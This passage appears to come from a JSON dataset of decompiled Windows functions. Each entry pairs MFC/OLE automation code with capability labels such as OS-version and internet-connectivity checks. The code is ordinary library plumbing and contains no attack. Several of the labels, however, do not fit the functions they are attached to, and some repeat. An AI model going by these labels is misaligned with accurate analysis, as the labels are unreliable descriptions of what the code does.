uVar7;\n    int32_t extraout_ECX;\n    int32_t *piVar8;\n    int32_t unaff_EBP;\n    float10 fVar9;\n    ulong uVar10;\n    uint var_4h;\n    uint var_6ch_2;\n    uint var_6ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_34h_2;\n    uint var_30h_3;\n    uint var_2ch_3;\n    uint var_30h_2;\n    uint var_2ch_2;\n    uint var_34h;\n    uint pvargDest;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1dh;\n    int32_t lpString;\n    uint uStack12;\n    uint var_10h;\n    uint uStack4;\n    \n    uStack4 = 0x50;\n    var_10h = 0x449e3d;\n    fcn.00458ee4();\n    *(unaff_EBP + -0x34) = extraout_ECX;\n    var_10h = *(extraout_ECX + 0x1c);\n    uStack12 = 0x449e4b;\n    fcn.0042b84e();\n    iVar6 = *(unaff_EBP + 8);\n    iVar5 = *(iVar6 + 8);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x1d) = 0;\n    *(unaff_EBP + -0x18) = iVar5;\n    if (iVar5 == 0) {\n        *(unaff_EBP + -0x18) = unaff_EBP + -0x1d;\n    }\n    uStack12 = *(unaff_EBP + -0x18);\n    lpString = 0x449e70;\n    iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    *(unaff_EBP + -0x28) = *(iVar6 + 0x10);\n    *(unaff_EBP + -0x24) = *(iVar6 + 0xc);\n    if ((*(unaff_EBP + 0xc) & 0xc) == 0) {\ncode_r0x00449ef7:\n        iVar6 = *(unaff_EBP + 0x14);\n        lpString = *(iVar6 + 8) << 4;\n        stack0xffffffec = 0x449f06;\n        cVar3 = fcn.004162a0();\n        if ((cVar3 != '\\0') && (uVar7 = *(iVar6 + 8),  uVar7 < 0x8000000)) {\n            lpString = 0x449f2f;\n            fcn.00458b60();\n            *(unaff_EBP + -0x10) = &stack0xfffffff4;\n            *(unaff_EBP + -0x1c) = &stack0xfffffff4;\n            stack0xffffffec = 0;\n            lpString = uVar7 << 4;\n            fcn.00459330(*(unaff_EBP + -0x1c));\n            lpString = *(unaff_EBP + -0x24);\n            unique0x00007a00 = *(unaff_EBP + -0x18);\n            iVar6 = fcn.00449148();\n            cVar3 = fcn.004162a0(iVar6 + 0x10);\n            if (cVar3 != '\\0') {\n                fcn.00458b60();\n                *(unaff_EBP + -0x10) = &fcn.00449e31::var_1dh + 1;\n                piVar8 = NULL;\n                *(unaff_EBP + -0x58) = vtable.CArray_class_CVariantBoolPair__class_CVariantBoolPair_const__.0;\n                *(unaff_EBP + -0x54) = 0;\n                *(unaff_EBP + -0x48) = 0;\n                *(unaff_EBP + -0x4c) = 0;\n                *(unaff_EBP + -0x50) = 0;\n                *(unaff_EBP + -4) = 1;\n                iVar5 = fcn.00449b49(&fcn.00449e31::var_1dh + 1, *(unaff_EBP + -0x18), unaff_EBP + -0x44, \n                                     *(unaff_EBP + -0x24), *(unaff_EBP + 0x14), *(unaff_EBP + 0x18), \n                                     *(unaff_EBP + -0x1c), unaff_EBP + -0x58);\n                *(unaff_EBP + -0x18) = iVar5;\n                if (iVar5 == 0) {\n                    uVar7 = *(unaff_EBP + -0x24);\n                    uVar1 = *(unaff_EBP + -0x28);\n                    *(unaff_EBP + -4) = 2;\n                    if (uVar7 == 4) {\n                        fVar9 = fcn.0044f890(uVar1, &fcn.00449e31::var_1dh + 1, iVar6);\n                        *(unaff_EBP + -0x34) = fVar9;\n                        *(unaff_EBP + -0x44) = *(unaff_EBP + -0x34);\n                    }\n                    else if ((uVar7 == 5) || (uVar7 == 7)) {\n                        fVar9 = fcn.0044f890(uVar1, &fcn.00449e31::var_1dh + 1, iVar6);\n                        *(unaff_EBP + -0x44) = fVar9;\n                    }\n                    else if (uVar7 - 0x14 < 2) {\n                        uVar10 = fcn.0044f890(uVar1, &fcn.00449e31::var_1dh + 1, iVar6);\n                        *(unaff_EBP + -0x44) = uVar10;\n                        *(unaff_EBP + -0x40) = uVar10 >> 0x20;\n                    }\n                    else {\n                        piVar8 = fcn.0044f890(uVar1, &fcn.00449e31::var_1dh + 1, iVar6);\n                    }\n                    *(unaff_EBP + -4) = 1;\n                }\n                iVar6 = *(unaff_EBP + 0x14);\n                uVar7 = 0;\n                if (*(iVar6 + 8) != 0) {\n                    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c);\n                    do {\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(*(unaff_EBP + -0x1c));\n                        *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 0x10;\n                        uVar7 = uVar7 + 1;\n                    } while (uVar7 < *(iVar6 + 8));\n                }\n                if (*(unaff_EBP + -0x18) != 0) {\n                    *(unaff_EBP + -4) = 0;\n                    fcn.004498ea();\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    if (*(unaff_EBP + -0x2c) != 0) {\n                        fcn.0042abcb(0, *(unaff_EBP + -0x30));\n                    }\n                    goto code_r0x0044a134;\n                }\n                fcn.00449894();\n                puVar2 = *(unaff_EBP + 0x10);\n                if (puVar2 == NULL) {\n                    iVar4 = *(unaff_EBP + -0x24);\n                    if (iVar4 == 8) {\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(piVar8);\n                    }\n                    else if (iVar4 == 9) {\ncode_r0x0044a0f3:\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\n                    }\n                    else if (iVar4 == 0xc) {\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(unaff_EBP + -0x44);\n                    }\n                    else if (iVar4 == 0xd) goto code_r0x0044a0f3;\n                }\n                else {\n                    uVar7 = *(unaff_EBP + -0x24);\n                    *puVar2 = uVar7;\n    // switch table (20 cases) at 0x44a141\n                    switch(uVar7 & 0xffff) {\n                    case 3:\n                    case 8:\n                    case 9:\n                    case 10:\n                    case 0xd:\n                    case 0x13:\n                        puVar2[2] = piVar8;\n                        break;\n                    case 4:\n                        puVar2[2] = *(unaff_EBP + -0x44);\n                        break;\n                    case 5:\n                    case 7:\n                        *(puVar2 + 2) = *(unaff_EBP + -0x44);\n                        break;\n                    case 6:\n                    case 0x14:\n                    case 0x15:\n                        puVar2[2] = *(unaff_EBP + -0x44);\n                        puVar2[3] = *(unaff_EBP + -0x40);\n                        break;\n                    case 0xb:\n                        piVar8 = -(piVar8 != 0);\n                    case 2:\n                    case 0x12:\n                        *(puVar2 + 2) = piVar8;\n                        break;\n                    case 0xc:\n                        *puVar2 = *(unaff_EBP + -0x44);\n                        puVar2[1] = *(unaff_EBP + -0x40);\n                        puVar2[2] = *(unaff_EBP + -0x3c);\n                        puVar2[3] = *(unaff_EBP + -0x38);\n                        break;\n                    case 0x10:\n                    case 0x11:\n                        *(puVar2 + 2) = piVar8;\n                    }\n                }\n                *(unaff_EBP + -4) = 0;\n                fcn.004498ea();\n                *(unaff_EBP + -4) = 0xffffffff;\n                if (*(unaff_EBP + -0x2c) != 0) {\n                    fcn.0042abcb(0, *(unaff_EBP + -0x30));\n                }\n                goto code_r0x0044a134;\n            }\n            goto code_r0x00449e93;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x2c) == 0) goto code_r0x0044a134;\n        lpString = *(unaff_EBP + -0x30);\n    }\n    else {\n        lpString = iVar5 + 3;\n        stack0xffffffec = 0x449e8e;\n        cVar3 = fcn.004162a0();\n        if (cVar3 != '\\0') {\n            lpString = 0x449eb8;\n            fcn.00458b60();\n            *(unaff_EBP + -0x10) = &stack0xfffffff4;\n            unique0x00007a00 = *(unaff_EBP + -0x18);\n            lpString = iVar5;\n            fcn.00417b17(&stack0xfffffff4, iVar5 + 3);\n            iVar4 = *(iVar6 + 0xc);\n            *(unaff_EBP + -0x18) = &stack0xfffffff4;\n            if (iVar4 == 8) {\n                iVar4 = 0xe;\n            }\n            *(unaff_EBP + -0x24) = 0;\n            (&stack0xfffffff4)[iVar5] = 0xff;\n            (&stack0xfffffff5)[iVar5] = iVar4;\n            (&stack0xfffffff6)[iVar5] = 0;\n            *(unaff_EBP + -0x28) = *(iVar6 + 0x14);\n            goto code_r0x00449ef7;\n        }\ncode_r0x00449e93:\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x2c) == 0) goto code_r0x0044a134;\n        lpString = *(unaff_EBP + -0x30);\n    }\n    stack0xffffffec = 0;\n    fcn.0042abcb();\ncode_r0x0044a134:\n    *(unaff_EBP + -0x70) = 0x44a13c;\n    fcn.00458f40();\n    return;\n}\n",
        "token_count": 3199
    },
    "0044a25a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0044a25a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00419079();\n    *extraout_ECX = vtable.COleDispatchException.0;\n    fcn.004018d0();\n    *(unaff_EBP + -4) = 0;\n    fcn.004018d0();\n    fcn.004018d0();\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 2;\n    extraout_ECX[4] = -(*(unaff_EBP + 0xc) != 0) & *(unaff_EBP + 0xc) + 0x60000U;\n    *(extraout_ECX + 2) = iVar1;\n    if (iVar2 != 0) {\n        fcn.00402280(*(unaff_EBP + 8));\n    }\n    extraout_ECX[7] = (-(iVar1 != 0) & 0x7fff0001) + 0x8000ffff;\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 360
    },
    "0044a9c3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0044a9c3(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CEnumArray.0;\n    pcVar1 = extraout_ECX[9];\n    *(unaff_EBP + -4) = 0;\n    if (pcVar1 != NULL) {\n        fcn.00430cf1();\n    }\n    if (extraout_ECX[0xd] != NULL) {\n        fcn.004170df(extraout_ECX[10]);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004220a2();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 229
    },
    "0044ad99": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044ad99(uint arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    pcVar1 = _sym.imp.ole32.dll_CoCreateInstance;\n    var_4h = NULL;\n    in_ECX[1] = 1;\n    var_8h = (*pcVar1)(arg_8h, 0, 0x17, 0x4965a4, &var_4h);\n    if (var_8h == -0x7ff8ffa9) {\n        var_8h = (*pcVar1)(arg_8h, 0, 7, 0x4965a4, &var_4h);\n    }\n    if ((-1 < var_8h) && (var_8h = (*_sym.imp.ole32.dll_OleRun)(var_4h),  -1 < var_8h)) {\n        iVar2 = fcn.00430b31(var_4h, 0x496534);\n        *in_ECX = iVar2;\n        if (iVar2 != 0) {\n            (**(*var_4h + 8))(var_4h);\n            return 1;\n        }\n    }\n    fcn.00430b55(&var_4h);\n    if (arg_ch != 0) {\n        *(arg_ch + 8) = var_8h;\n    }\n    return 0;\n}\n",
        "token_count": 354
    },
    "0044ae38": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ae38(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = *param_1;\n    if (piVar1 != NULL) {\n        if (param_1[1] != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        *param_1 = NULL;\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "0044ae96": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ae96(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t **ppuVar4;\n    int32_t iVar5;\n    uint uStack28;\n    \n    iVar5 = 0;\n    if (0 < *(param_1 + 8)) {\n        do {\n            piVar2 = fcn.00449254();\n            if ((*piVar2 == 0) || (iVar3 = fcn.00449254(),  *(iVar3 + 4) == 0)) {\n                uStack28 = 0x4a8690;\n                fcn.00456b8d(&stack0xffffffe4, 0x49ed44);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            uStack28 = 0x44aec5;\n            iVar3 = fcn.00449254();\n            ppuVar4 = fcn.00449254();\n            iVar5 = iVar5 + 1;\n            **ppuVar4 = **(iVar3 + 4) != 0;\n        } while (iVar5 < *(param_1 + 8));\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "0044af79": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: pbstr\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0044af79(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint lpString, uint arg_1ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    uint16_t *puVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    int64_t iVar9;\n    code *pcVar10;\n    code *pcVar11;\n    int16_t iVar12;\n    uint uVar13;\n    int32_t iVar14;\n    uint32_t *puVar15;\n    int32_t iVar16;\n    int32_t *extraout_ECX;\n    uint32_t **ppuVar17;\n    int32_t unaff_EBP;\n    ulong *puVar18;\n    char *pcVar19;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint pvargDest;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint pbstr;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_4h;\n    uint uVar20;\n    \n    uVar20 = 0x7c;\n    fcn.00458e45(0x7c);\n    *(unaff_EBP + -0x24) = extraout_ECX;\n    if (*extraout_ECX != 0) {\n        *(unaff_EBP + -0x54) = 0;\n        *(unaff_EBP + -0x50) = 0;\n        *(unaff_EBP + -0x4c) = 0;\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -4) = 0;\n        fcn.00459330(unaff_EBP + -0x54, 0, 0x10);\n        if (*(unaff_EBP + 0x18) != 0) {\n            uVar13 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(unaff_EBP + 0x18));\n            *(unaff_EBP + -0x4c) = uVar13;\n        }\n        *(unaff_EBP + -0x20) = 0xfffffffd;\n        if ((*(unaff_EBP + 0xc) & 0xc) != 0) {\n            *(unaff_EBP + -0x48) = 1;\n            *(unaff_EBP + -0x50) = unaff_EBP + -0x20;\n        }\n        *(unaff_EBP + -0x68) = vtable.CArray_class_CVariantBoolPair__class_CVariantBoolPair_const__.0;\n        *(unaff_EBP + -100) = 0;\n        *(unaff_EBP + -0x58) = 0;\n        *(unaff_EBP + -0x5c) = 0;\n        *(unaff_EBP + -0x60) = 0;\n        *(unaff_EBP + -4) = 1;\n        if (*(unaff_EBP + -0x4c) != 0) {\n            iVar9 = *(unaff_EBP + -0x4c) * 0x10;\n            iVar14 = fcn.004170b4(-(iVar9 >> 0x20 != 0) | iVar9);\n            *(unaff_EBP + -0x54) = iVar14;\n            fcn.00459330(iVar14, 0, *(unaff_EBP + -0x4c) << 4);\n            cVar1 = **(unaff_EBP + 0x18);\n            iVar14 = iVar14 + -0x10 + *(unaff_EBP + -0x4c) * 0x10;\n            *(unaff_EBP + -0x14) = *(unaff_EBP + 0x18);\n            *(unaff_EBP + -0x10) = iVar14;\n            if (cVar1 != '\\0') {\n                puVar18 = iVar14 + 8;\n                ppuVar17 = *(unaff_EBP + 0x1c) + -4;\n                *(unaff_EBP + -0x1c) = puVar18;\n                *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + -8;\n                do {\n                    uVar2 = **(unaff_EBP + -0x14);\n                    puVar4 = *(unaff_EBP + -0x10);\n                    *puVar4 = uVar2;\n                    if ((uVar2 & 0x40) != 0) {\n                        *puVar4 = uVar2 & 0xffbf | 0x4000;\n                    }\n                    uVar3 = *puVar4;\n                    if (0x4002 < uVar3) {\n    // switch table (19 cases) at 0x44b4bd\n                        switch(uVar3) {\n                        case 0x4003:\n                        case 0x4004:\n                        case 0x4005:\n                        case 0x4006:\n                        case 0x4007:\n                        case 0x4008:\n                        case 0x4009:\n                        case 0x400a:\n                        case 0x400c:\n                        case 0x400d:\n                        case 0x4010:\n                        case 0x4011:\n                        case 0x4012:\n                        case 0x4013:\n                        case 0x4014:\n                        case 0x4015:\n                            goto code_r0x0044b1f6;\n                        case 0x400b:\n                            *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                            ppuVar17 = ppuVar17 + 1;\n                            puVar15 = *ppuVar17;\n                            *puVar15 = -(*puVar15 != 0) & 0xffff;\n                            *puVar18 = puVar15;\n                            fcn.0044927a(puVar15, puVar15, 0);\n                            uVar20 = *(unaff_EBP + -0x60);\n                            *(unaff_EBP + -4) = 3;\n                            fcn.004499b4();\n                            *(unaff_EBP + -4) = 1;\n                            if (*(unaff_EBP + -0x2c) != 0) {\n                                fcn.004170df(*(unaff_EBP + -0x34));\n                            }\n                        }\n                        goto code_r0x0044b1ff;\n                    }\n                    if (uVar3 == 0x4002) {\ncode_r0x0044b1f6:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        ppuVar17 = ppuVar17 + 1;\n                        *puVar18 = *ppuVar17;\n                        goto code_r0x0044b1ff;\n                    }\n    // switch table (20 cases) at 0x44b46d\n                    switch(uVar3) {\n                    case 2:\n                    case 0x12:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        iVar12 = *(ppuVar17 + 1);\n                        goto code_r0x0044b180;\n                    case 3:\n                    case 9:\n                    case 10:\n                    case 0xd:\n                    case 0x13:\n                        goto code_r0x0044b1f6;\n                    case 4:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 8;\n                        ppuVar17 = ppuVar17 + 2;\n                        *puVar18 = **(unaff_EBP + 0x1c);\n                        break;\n                    case 5:\n                    case 7:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 8;\n                        ppuVar17 = ppuVar17 + 2;\n                        *puVar18 = **(unaff_EBP + 0x1c);\n                        break;\n                    case 6:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        ppuVar17 = ppuVar17 + 1;\n                        puVar15 = *ppuVar17;\n                        goto code_r0x0044b0c5;\n                    case 8:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        ppuVar17 = ppuVar17 + 1;\n                        puVar15 = *ppuVar17;\n                        *(unaff_EBP + -0x1c) = puVar15;\n                        iVar16 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(puVar15, uVar20);\n                        iVar14 = *(unaff_EBP + -0x1c);\n                        *puVar18 = iVar16;\n                        if ((iVar14 != 0) && (iVar16 == 0)) {\n                            do {\n                                fcn.00418fe6();\ncode_r0x0044b12d:\n                                *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                                ppuVar17 = ppuVar17 + 1;\n                                puVar15 = *ppuVar17;\n                                *(unaff_EBP + -0x1c) = puVar15;\n                                fcn.00418c5b(puVar15);\n                                *(unaff_EBP + -4) = 2;\n                                iVar16 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(*(unaff_EBP + -0x18));\n                                iVar14 = *(unaff_EBP + -0x1c);\n                                *puVar18 = iVar16;\n                            } while ((iVar14 != 0) && (iVar16 == 0));\n                            **(unaff_EBP + -0x10) = 8;\n                            *(unaff_EBP + -4) = 1;\n                            fcn.004010d0();\n                        }\n                        break;\n                    case 0xb:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        iVar12 = -(ppuVar17[1] != NULL);\ncode_r0x0044b180:\n                        ppuVar17 = ppuVar17 + 1;\n                        *puVar18 = iVar12;\n                        break;\n                    case 0xc:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        puVar15 = *(unaff_EBP + -0x10);\n                        ppuVar17 = ppuVar17 + 1;\n                        puVar5 = *ppuVar17;\n                        *puVar15 = *puVar5;\n                        puVar15[1] = puVar5[1];\n                        puVar15[2] = puVar5[2];\n                        puVar15[3] = puVar5[3];\n                        puVar18 = *(unaff_EBP + -0x1c);\n                        break;\n                    case 0xe:\n                        goto code_r0x0044b12d;\n                    case 0x10:\n                    case 0x11:\n                        *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + 4;\n                        ppuVar17 = ppuVar17 + 1;\n                        *puVar18 = *ppuVar17;\n                        break;\n                    case 0x14:\n                    case 0x15:\n                        puVar15 = *(unaff_EBP + 0x1c) + 8;\n                        *(unaff_EBP + 0x1c) = puVar15;\n                        ppuVar17 = ppuVar17 + 2;\ncode_r0x0044b0c5:\n                        *puVar18 = *puVar15;\n                        *(puVar18 + 4) = puVar15[1];\n                    }\ncode_r0x0044b1ff:\n                    *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + -0x10;\n                    puVar18 = puVar18 + -2;\n                    *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 1;\n                    cVar1 = **(unaff_EBP + -0x14);\n                    *(unaff_EBP + -0x1c) = puVar18;\n                } while (cVar1 != '\\0');\n            }\n        }\n        iVar16 = 0;\n        iVar14 = 0;\n        fcn.0043376f(unaff_EBP + -0x44);\n        if (*(unaff_EBP + 0x10) != 0) {\n            iVar14 = unaff_EBP + -0x44;\n        }\n        fcn.00459330(unaff_EBP + -0x88, 0, 0x20);\n        piVar6 = **(unaff_EBP + -0x24);\n        *(unaff_EBP + -0x28) = 0xffffffff;\n        uVar20 = (**(*piVar6 + 0x18))\n                           (piVar6, *(unaff_EBP + 8), 0x495414, 0, *(unaff_EBP + 0xc), unaff_EBP + -0x54, iVar14, \n                            unaff_EBP + -0x88, unaff_EBP + -0x28);\n        *(unaff_EBP + 0xc) = uVar20;\n        fcn.0044ae96();\n        if (*(unaff_EBP + -0x4c) != 0) {\n            iVar14 = *(unaff_EBP + -0x4c) * 0x10 + -0x10 + *(unaff_EBP + -0x54);\n            for (pcVar19 = *(unaff_EBP + 0x18); *pcVar19 != '\\0'; pcVar19 = pcVar19 + 1) {\n                if ((*pcVar19 == '\\b') || (*pcVar19 == '\\x0e')) {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(iVar14);\n                }\n                iVar14 = iVar14 + -0x10;\n            }\n        }\n        fcn.004170df(*(unaff_EBP + -0x54));\n        *(unaff_EBP + -0x54) = 0;\n        if (-1 < *(unaff_EBP + 0xc)) goto code_r0x0044b38a;\n        var_4h = unaff_EBP + -0x44;\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n        if (*(unaff_EBP + 0xc) == -0x7ffdfff7) goto code_r0x0044b2d6;\n        while( true ) {\n            fcn.00417c31(var_4h);\ncode_r0x0044b2d6:\n            if (*(unaff_EBP + -0x70) != iVar16) {\n                (**(unaff_EBP + -0x70))(unaff_EBP + -0x88);\n            }\n            iVar14 = fcn.004170b4(0x20);\n            *(unaff_EBP + 0x14) = iVar14;\n            *(unaff_EBP + -4) = 4;\n            if (iVar14 != iVar16) {\n                iVar16 = fcn.0044a25a(iVar16, iVar16, *(unaff_EBP + -0x88));\n            }\n            pcVar10 = _sym.imp.OLEAUT32.dll_VariantInit;\n            *(unaff_EBP + -4) = 1;\n            iVar14 = (*pcVar10)(*(unaff_EBP + -0x84));\n            if (iVar14 != 0) {\n                fcn.0041829a(*(unaff_EBP + -0x84));\n            }\n            pcVar11 = _sym.imp.OLEAUT32.dll_SysStringLen;\n            (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(unaff_EBP + -0x84));\n            iVar14 = (*pcVar10)(*(unaff_EBP + -0x80));\n            if (iVar14 != 0) {\n                fcn.0041829a(*(unaff_EBP + -0x80));\n            }\n            (*pcVar11)(*(unaff_EBP + -0x80));\n            iVar14 = (*pcVar10)(*(unaff_EBP + -0x7c));\n            if (iVar14 != 0) {\n                fcn.0041829a(*(unaff_EBP + -0x7c));\n            }\n            (*pcVar11)(*(unaff_EBP + -0x7c));\n            *(iVar16 + 0x10) = *(unaff_EBP + -0x78);\n            *(iVar16 + 0x1c) = *(unaff_EBP + -0x6c);\n            *(unaff_EBP + 0x14) = iVar16;\n            fcn.00456b8d(unaff_EBP + 0x14, 0x4a36d8);\ncode_r0x0044b38a:\n            uVar7 = *(unaff_EBP + 0x10);\n            if (uVar7 == iVar16) goto code_r0x0044b447;\n            if ((uVar7 == 0xc) ||\n               (var_4h = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)\n                                   (unaff_EBP + -0x44, unaff_EBP + -0x44, iVar16, uVar7),  iVar16 <= var_4h)) break;\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(unaff_EBP + -0x44);\n        }\n    // switch table (20 cases) at 0x44b509\n        switch(uVar7 & 0xffff) {\n        case 2:\n        case 0x12:\n            **(unaff_EBP + 0x14) = *(unaff_EBP + -0x3c);\n            break;\n        case 3:\n        case 9:\n        case 10:\n        case 0xd:\n        case 0x13:\n            **(unaff_EBP + 0x14) = *(unaff_EBP + -0x3c);\n            break;\n        case 4:\n            **(unaff_EBP + 0x14) = *(unaff_EBP + -0x3c);\n            break;\n        case 5:\n        case 7:\n            **(unaff_EBP + 0x14) = *(unaff_EBP + -0x3c);\n            break;\n        case 6:\n        case 0x14:\n        case 0x15:\n            puVar8 = *(unaff_EBP + 0x14);\n            *puVar8 = *(unaff_EBP + -0x3c);\n            puVar8[1] = *(unaff_EBP + -0x38);\n            break;\n        case 8:\n            fcn.00430adc(*(unaff_EBP + 0x14), *(unaff_EBP + -0x3c));\n            (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(unaff_EBP + -0x3c));\n            break;\n        case 0xb:\n            **(unaff_EBP + 0x14) = *(unaff_EBP + -0x3c) != iVar16;\n            break;\n        case 0xc:\n            puVar8 = *(unaff_EBP + 0x14);\n            *puVar8 = *(unaff_EBP + -0x44);\n            puVar8[1] = *(unaff_EBP + -0x40);\n            puVar8[2] = *(unaff_EBP + -0x3c);\n            puVar8[3] = *(unaff_EBP + -0x38);\n            iVar16 = 0;\n            break;\n        case 0x10:\n        case 0x11:\n            **(unaff_EBP + 0x14) = *(unaff_EBP + -0x3c);\n        }\ncode_r0x0044b447:\n        *(unaff_EBP + -4) = 0;\n        fcn.004498ea();\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x54) != iVar16) {\n            fcn.004170df(*(unaff_EBP + -0x54));\n        }\n    }\n    